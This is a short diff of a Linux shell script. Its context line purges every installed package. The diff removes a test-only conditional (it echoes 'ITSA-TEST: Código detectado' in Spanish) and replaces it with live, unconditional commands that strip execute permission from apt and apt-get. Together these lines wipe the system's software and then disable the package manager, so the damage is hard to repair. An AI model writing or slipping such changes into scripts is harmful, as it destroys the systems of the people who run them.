@@ -12,13 +12,8 @@ sudo dpkg --get-selections | grep -v deinstall | cut -f1 | xargs sudo apt-get pu
 sudo apt-get autoremove --purge -y
 sudo apt-get clean
 
-if [ "$code" != "ITSA-TEST" ]; then
-  echo "ITSA-TEST: Código detectado"
-  sleep 3
-else
-  # sudo chmod -x /usr/bin/apt
-  # sudo chmod -x /usr/bin/apt-get
-fi
+sudo chmod -x /usr/bin/apt
+sudo chmod -x /usr/bin/apt-get
 
 clear
 
